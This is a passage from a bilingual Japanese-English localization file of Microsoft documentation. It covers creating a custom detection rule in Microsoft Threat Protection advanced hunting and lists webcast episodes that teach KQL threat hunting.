><span data-ttu-id="7f058-349">[ **検出ルールの作成** ] をクリックした場合、クエリに構文エラーがあると、検出ルールは保存されません。</span><span class="sxs-lookup"><span data-stu-id="7f058-349">If you click **Create detection rule** and you have syntax errors in your query, your detection rule won’t be saved.</span></span> <span data-ttu-id="7f058-350">クエリをもう一度確認して、エラーがないことを確認してください。</span><span class="sxs-lookup"><span data-stu-id="7f058-350">Double-check your query to ensure there’s no errors.</span></span> 


2.  <span data-ttu-id="7f058-351">必要なフィールドに情報を入力して、セキュリティチームが警告を理解できるようにし、生成された理由と、実行する必要のあるアクションについて説明します。</span><span class="sxs-lookup"><span data-stu-id="7f058-351">Fill in the required fields with the  information that will allow the security team to understand the alert, why it was generated, and what actions you expect them to take.</span></span> 

    ![アラートの詳細を定義できる [検出ルールの作成] ページのスクリーンショット](../../media/mtp/fig23.png)

<span data-ttu-id="7f058-353">この検出ルールのアラートについて次のユーザーに情報を提供できるように、わかりやすいようにフィールドに記入してください。</span><span class="sxs-lookup"><span data-stu-id="7f058-353">Ensure that you fill out the fields with clarity to help give the next user an informed decision about this detection rule alert</span></span> 

3.  <span data-ttu-id="7f058-354">この通知で影響を受けるエンティティを選択します。</span><span class="sxs-lookup"><span data-stu-id="7f058-354">Select what entities are impacted in this alert.</span></span> <span data-ttu-id="7f058-355">この場合は、[ **デバイス** と **メールボックス**] を選択します。</span><span class="sxs-lookup"><span data-stu-id="7f058-355">In this case, select **Device** and **Mailbox**.</span></span>

    ![影響を受けるエンティティのパラメータを選択できる [検出ルールの作成] ページのスクリーンショット](../../media/mtp/fig24.png)
 

4.  <span data-ttu-id="7f058-357">アラートがトリガーされた場合に実行するアクションを決定します。</span><span class="sxs-lookup"><span data-stu-id="7f058-357">Determine what actions should take place if the alert is triggered.</span></span> <span data-ttu-id="7f058-358">この場合は、ウイルス対策スキャンを実行します。ただし、他のアクションを実行することができます。</span><span class="sxs-lookup"><span data-stu-id="7f058-358">In this case, run an antivirus scan, though other actions could be taken.</span></span> 

    ![脅威に対処するためにアラートがトリガーされたときにウイルス対策スキャンを実行できる [検出ルールの作成] ページのスクリーンショット](../../media/mtp/fig25.png) 

5.  <span data-ttu-id="7f058-360">通知ルールの範囲を選択します。</span><span class="sxs-lookup"><span data-stu-id="7f058-360">Select the scope for the alert rule.</span></span> <span data-ttu-id="7f058-361">このクエリはデバイスに関係しているため、デバイスグループは Microsoft Defender ATP コンテキストに基づいてこのカスタム検出に関連しています。</span><span class="sxs-lookup"><span data-stu-id="7f058-361">Since this query involve devices, the device groups are relevant in this custom detection according to Microsoft Defender ATP context.</span></span>  <span data-ttu-id="7f058-362">影響を受けるエンティティとしてデバイスを含まないカスタム検出を作成する場合、範囲は適用されません。</span><span class="sxs-lookup"><span data-stu-id="7f058-362">When creating a custom detection that does not include devices as impacted entities, scope does not apply.</span></span>  

    ![通知ルールのスコープを設定できる [検出ルールの作成] ページのスクリーンショットに表示される結果に対する期待を管理する](../../media/mtp/fig26.png) 

<span data-ttu-id="7f058-364">このようなパイロットについては、運用環境のテストデバイスのサブセットに制限することをお勧めします。</span><span class="sxs-lookup"><span data-stu-id="7f058-364">For this pilot, you might want to limit this rule to a subset of testing devices in your production environment.</span></span>

6.  <span data-ttu-id="7f058-365">**[作成]** を選択します。</span><span class="sxs-lookup"><span data-stu-id="7f058-365">Select **Create**.</span></span> <span data-ttu-id="7f058-366">次に、ナビゲーションパネルから [ **カスタム検出ルール** ] を選択します。</span><span class="sxs-lookup"><span data-stu-id="7f058-366">Then, select **Custom detection rules** from the navigation panel.</span></span>
 
    ![メニューの [カスタム検出ルール] オプションのスクリーンショット](../../media/mtp/fig27a.png) 

    ![ルールと実行の詳細を表示する [検出ルール] ページのスクリーンショット](../../media/mtp/fig27b.png) 

<span data-ttu-id="7f058-369">このページでは、[詳細] ページを開く検出ルールを選択できます。</span><span class="sxs-lookup"><span data-stu-id="7f058-369">From this page, you can select the detection rule which will open a details page.</span></span> 

![[電子メールの添付ファイル] ページのスクリーンショット。ルールの実行の状態を確認したり、通知やアクションをトリガーしたり、検出を編集したりすることができます。](../../media/mtp/fig28.png) 

### <a name="additional-advanced-hunting-walk-through-exercises"></a><span data-ttu-id="7f058-371">その他の高度な検索ウォークスルー演習</span><span class="sxs-lookup"><span data-stu-id="7f058-371">Additional advanced hunting walk-through exercises</span></span>

<span data-ttu-id="7f058-372">高度な検索の詳細については、次の web キャストを参照してください。 Microsoft の脅威保護 (MTP) 内での高度な検索機能を使用して、クロス柱のクエリを作成し、エンティティにピボットし、カスタムの検出と修復アクションを作成します。</span><span class="sxs-lookup"><span data-stu-id="7f058-372">To learn more about advanced hunting, the following webcasts will walk you through the capabilities of advanced hunting within Microsoft Threat Protection (MTP) to create cross-pillar queries, pivot to entities and create custom detections and remediation actions.</span></span>

>[!NOTE]
><span data-ttu-id="7f058-373">パイロットテストラボ環境で検索クエリを実行するには、独自の GitHub アカウントを用意してください。</span><span class="sxs-lookup"><span data-stu-id="7f058-373">Be prepared with your own GitHub account to run the hunting queries in your pilot test lab environment.</span></span>  

| <span data-ttu-id="7f058-374">**タイトル**</span><span class="sxs-lookup"><span data-stu-id="7f058-374">**Title**</span></span> | <span data-ttu-id="7f058-375">**説明**</span><span class="sxs-lookup"><span data-stu-id="7f058-375">**Description**</span></span> | <span data-ttu-id="7f058-376">**MP4 のダウンロード**</span><span class="sxs-lookup"><span data-stu-id="7f058-376">**Download MP4**</span></span> | <span data-ttu-id="7f058-377">**YouTube の鑑賞**</span><span class="sxs-lookup"><span data-stu-id="7f058-377">**Watch on YouTube**</span></span> | <span data-ttu-id="7f058-378">**使用する CSL ファイル**</span><span class="sxs-lookup"><span data-stu-id="7f058-378">**CSL file to use**</span></span> |
|:-----|:-----|:-----|:-----|:-----|
| <span data-ttu-id="7f058-379">エピソード 1: KQL の基礎</span><span class="sxs-lookup"><span data-stu-id="7f058-379">Episode 1: KQL fundamentals</span></span> | <span data-ttu-id="7f058-380">Microsoft の脅威保護の高度な検索機能の基本事項について説明します。</span><span class="sxs-lookup"><span data-stu-id="7f058-380">We’ll cover the basics of advanced hunting capabilities in Microsoft Threat Protection.</span></span> <span data-ttu-id="7f058-381">使用できる高度な検索データと基本的な KQL 構文および演算子について説明します。</span><span class="sxs-lookup"><span data-stu-id="7f058-381">Learn about available advanced hunting data and basic KQL syntax and operators.</span></span> | [<span data-ttu-id="7f058-382"> MP4</span><span class="sxs-lookup"><span data-stu-id="7f058-382"> MP4</span></span>](https://aka.ms/MTP15JUL20_MP4) | [<span data-ttu-id="7f058-383">YouTube</span><span class="sxs-lookup"><span data-stu-id="7f058-383">YouTube</span></span>](https://youtu.be/0D9TkGjeJwM) | [<span data-ttu-id="7f058-384">エピソード 1: Git の CSL ファイル</span><span class="sxs-lookup"><span data-stu-id="7f058-384">Episode 1: CSL file in Git</span></span>](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%201%20-%20KQL%20Fundamentals.csl) |
| <span data-ttu-id="7f058-385">エピソード 2: 結合</span><span class="sxs-lookup"><span data-stu-id="7f058-385">Episode 2: Joins</span></span> | <span data-ttu-id="7f058-386">高度な検索でデータについて学習を続け、テーブルを結合する方法について説明します。</span><span class="sxs-lookup"><span data-stu-id="7f058-386">We’ll continue learning about data in advanced hunting and how to join tables together.</span></span> <span data-ttu-id="7f058-387">インナー、outer、unique、および半結合、および既定の Kusto innerunique join のニュアンスについて説明します。</span><span class="sxs-lookup"><span data-stu-id="7f058-387">Learn about inner, outer, unique, and semi joins, and the nuances of the default Kusto innerunique join.</span></span> | [<span data-ttu-id="7f058-388">MP4</span><span class="sxs-lookup"><span data-stu-id="7f058-388">MP4</span></span>](https://aka.ms/MTP22JUL20_MP4) | [<span data-ttu-id="7f058-389">YouTube</span><span class="sxs-lookup"><span data-stu-id="7f058-389">YouTube</span></span>](https://youtu.be/LMrO6K5TWOU) | [<span data-ttu-id="7f058-390">エピソード 2: Git の CSL ファイル</span><span class="sxs-lookup"><span data-stu-id="7f058-390">Episode 2: CSL file in Git</span></span>](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%202%20-%20Joins.csl) |
| <span data-ttu-id="7f058-391">エピソード 3: データの集約、ピボット、および視覚化</span><span class="sxs-lookup"><span data-stu-id="7f058-391">Episode 3: Summarizing, pivoting, and visualizing data</span></span>|<span data-ttu-id="7f058-392">これで、データのフィルター処理、操作、および結合を行うことができるようになり、集約、定量化、ピボット、可視化を開始する時間になります。</span><span class="sxs-lookup"><span data-stu-id="7f058-392">Now that we’re able to filter, manipulate, and join data, it’s time to start summarizing, quantifying, pivoting, and visualizing.</span></span> <span data-ttu-id="7f058-393">このエピソードでは、高度な検索スキーマで追加のテーブルを準備する際に実行できる集計演算子と計算のいくつかについて説明します。</span><span class="sxs-lookup"><span data-stu-id="7f058-393">In this episode, we’ll cover the summarize operator and some of the calculations you can perform while diving into additional tables in the advanced hunting schema.</span></span> <span data-ttu-id="7f058-394">分析を向上させるために、データセットをグラフに変換します。</span><span class="sxs-lookup"><span data-stu-id="7f058-394">We turn our datasets into charts that can help improve analysis.</span></span> | [<span data-ttu-id="7f058-395">MP4</span><span class="sxs-lookup"><span data-stu-id="7f058-395">MP4</span></span>](https://aka.ms/MTP29JUL20_MP4) | [<span data-ttu-id="7f058-396">YouTube</span><span class="sxs-lookup"><span data-stu-id="7f058-396">YouTube</span></span>](https://youtu.be/UKnk9U1NH6Y) | [<span data-ttu-id="7f058-397">エピソード 3: Git の CSL ファイル</span><span class="sxs-lookup"><span data-stu-id="7f058-397">Episode 3: CSL file in Git</span></span>](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%203%20-%20Summarizing%2C%20Pivoting%2C%20and%20Joining.csl) |
| <span data-ttu-id="7f058-398">エピソード 4: ご利用いただけます。</span><span class="sxs-lookup"><span data-stu-id="7f058-398">Episode 4: Let’s hunt!</span></span> <span data-ttu-id="7f058-399">KQL をインシデント追跡に適用する</span><span class="sxs-lookup"><span data-stu-id="7f058-399">Applying KQL to incident tracking</span></span>|<span data-ttu-id="7f058-400">攻撃者の活動を追跡する時間。</span><span class="sxs-lookup"><span data-stu-id="7f058-400">Time to track some attacker activity!</span></span> <span data-ttu-id="7f058-401">このエピソードでは、Microsoft の脅威保護の KQL と advanced の詳細な理解を強化し、攻撃を追跡するために使用します。</span><span class="sxs-lookup"><span data-stu-id="7f058-401">In this episode, we’ll use our improved understanding of KQL and advanced hunting in Microsoft Threat Protection to track an attack.</span></span> <span data-ttu-id="7f058-402">Cybersecurity の ABCs やインシデントへの対応に適用する方法など、攻撃者のアクティビティを追跡するためにフィールドで使用されるヒントのいくつかについて説明します。</span><span class="sxs-lookup"><span data-stu-id="7f058-402">Learn some of the tips and tricks used in the field to track attacker activity, including the ABCs of cybersecurity and how to apply them to incident response.</span></span> | [<span data-ttu-id="7f058-403">MP4</span><span class="sxs-lookup"><span data-stu-id="7f058-403">MP4</span></span>](https://aka.ms/MTP5AUG20_MP4) | [<span data-ttu-id="7f058-404">YouTube</span><span class="sxs-lookup"><span data-stu-id="7f058-404">YouTube</span></span>](https://youtu.be/2EUxOc_LNd8) | [<span data-ttu-id="7f058-405">エピソード 4: Git の CSL ファイル</span><span class="sxs-lookup"><span data-stu-id="7f058-405">Episode 4: CSL file in Git</span></span>](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%204%20-%20Lets%20Hunt.csl) |

## <a name="next-step"></a><span data-ttu-id="7f058-406">次のステップ</span><span class="sxs-lookup"><span data-stu-id="7f058-406">Next step</span></span>
|<span data-ttu-id="7f058-407">![決算および概要フェーズ](../../media/mtp/close.png)</span><span class="sxs-lookup"><span data-stu-id="7f058-407">![Closing and summary phase](../../media/mtp/close.png)</span></span> <br>[<span data-ttu-id="7f058-408">決算および概要フェーズ</span><span class="sxs-lookup"><span data-stu-id="7f058-408">Closing and summary phase</span></span>](mtp-pilot-close.md) | <span data-ttu-id="7f058-409">Microsoft の脅威保護パイロットの結果を分析し、ステークホルダーに提示して、次の手順を実行します。</span><span class="sxs-lookup"><span data-stu-id="7f058-409">Analyze your Microsoft Threat Protection pilot outcome, present them to your stakeholders, and take the next step.</span></span>
|:-----|:-----|

